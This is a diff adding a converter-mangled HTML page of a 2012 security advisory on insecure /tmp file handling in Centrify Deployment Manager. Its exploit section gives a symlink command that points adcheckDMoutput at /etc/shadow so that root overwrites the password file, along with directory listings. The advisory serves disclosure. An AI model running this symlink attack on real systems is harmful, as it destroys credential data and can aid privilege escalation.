@@ -1,0 +1,43 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title></title>
+<meta name="generator" content="HTML::TextToHTML v2.51"/>
+</head>
+<body>
+<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
+</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
+    white-space: -moz-pre-wrap; /</em> Firefox <em>/
+    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
+    white-space: -o-pre-wrap;   /</em> Opera 7 */
+    word-wrap: break-word;<br/>
+}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 28&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Centrify Deployment Manager v2.1.0.283 /tmp file clobbering vulnerability&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2012-12-03&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="http://www.centrify.com/">http://www.centrify.com/</a>"&gt;<a href="http://www.centrify.com/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://www.centrify.com/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;Centrify&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2012-12-03&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="mailto:info@centrify.com">info@centrify.com</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;While at a training session for centrify, I noticed poor handling of files in /tmp. I was able to overwrite /etc/shadow with the contents of adcheckDMoutput.
+</p><p>I am sure there are more vulnerabilities to be exploited, maybe a local root - but being this is a training class I should probably pay attention.
+</p><p>total 6680<br/>
+-rwxr-xr-x 1 clyde clyde 6790300 Dec 3 14:41 adcheck-rhel3-i386.210
+</p><pre>
+-rw-rw-r-- 1 clyde clyde     188 Dec  3 14:41 centrify.cmd.210
+-rwxr-xr-x 1 root  root      187 Dec  3 14:18 engnew-cen.sh
+</pre>
+<p>[root@engnew-cen tmp]# ls -l<br/>
+total 6680
+</p><p>-rw-rw-rw- 1 root  root     3999 Dec  3 14:41 adcheckDMoutput
+-rwxr-xr-x 1 clyde clyde 6790300 Dec  3 14:41 adcheck-rhel3-i386.210
+-rwxr-xr-x 1 root  root      187 Dec  3 14:18 engnew-cen.sh
+[root@engnew-cen tmp]# ls -l<br/>
+total 6688
+</p><p>-rw-rw-rw- 1 root  root     3999 Dec  3 14:41 adcheckDMoutput 
+-rwxr-xr-x 1 clyde clyde 6790300 Dec  3 14:41 adcheck-rhel3-i386.210
+</p><pre>
+-rwxr-xr-x 1 clyde clyde     132 Dec  3 14:41 centrify.cmd.210
+-rwxr-xr-x 1 root  root      187 Dec  3 14:18 engnew-cen.sh
+</pre>
+<p>[root@engnew-cen tmp]# ls -l<br/>
+total 6672<br/>
+-rwxr-xr-x 1 clyde clyde 6790300 Dec 3 14:41 adcheck-rhel3-i386.210 -rwxr-xr-x 1 root root 187 Dec 3 14:18 engnew-cen.sh&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=28"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;$ nobody&lt;span style="color: #339933;"&gt;&amp;gt;&lt;/span&gt; ln &lt;span style="color: #339933;"&gt;-&lt;/span&gt;s &lt;span style="color: #339933;"&gt;/&lt;/span&gt;etc&lt;span style="color: #339933;"&gt;/&lt;/span&gt;shadow adcheckDMoutput&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;# ls -l /etc/shadow&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #339933;"&gt;-&lt;/span&gt;r&lt;span style="color: #339933;"&gt;--------&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;1&lt;/span&gt; root root &lt;span style="color: #cc66cc;"&gt;3999&lt;/span&gt; Dec &lt;span style="color: #cc66cc;"&gt;3&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;14&lt;/span&gt;&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;56&lt;/span&gt; &lt;span style="color: #339933;"&gt;/&lt;/span&gt;etc&lt;span style="color: #339933;"&gt;/&lt;/span&gt;shadow &lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #339933;"&gt;/&lt;/span&gt;etc&lt;span style="color: #339933;"&gt;/&lt;/span&gt;shadow has been overwritten with the contents of adcheckDMoutput&lt;span style="color: #339933;"&gt;,&lt;/span&gt; which is generated when software is pushed to a host via Deployment Manager&lt;span style="color: #339933;"&gt;.&lt;/span&gt; &lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;The &lt;span style="color: #cc66cc;"&gt;210&lt;/span&gt; appended to the &lt;a href="<a href="http://www.php.net/end">http://www.php.net/end</a>"&gt;&lt;span style="color: #990000;"&gt;end&lt;/span&gt;&lt;/a&gt; of files in &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp is the users UID number&lt;span style="color: #339933;"&gt;.&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisories/centrify_deployment_manager_insecure_tmp.html">http://www.vapid.dhs.org/advisories/centrify_deployment_manager_insecure_tmp.html</a>"&gt;<a href="http://www.vapid.dhs.org/advisories/centrify_deployment_manager_insecure_tmp.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisories/centrify_deployment_manager_insecure_tmp.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
+&lt;/html&gt;
+</p>
+
+</body>
+</html>
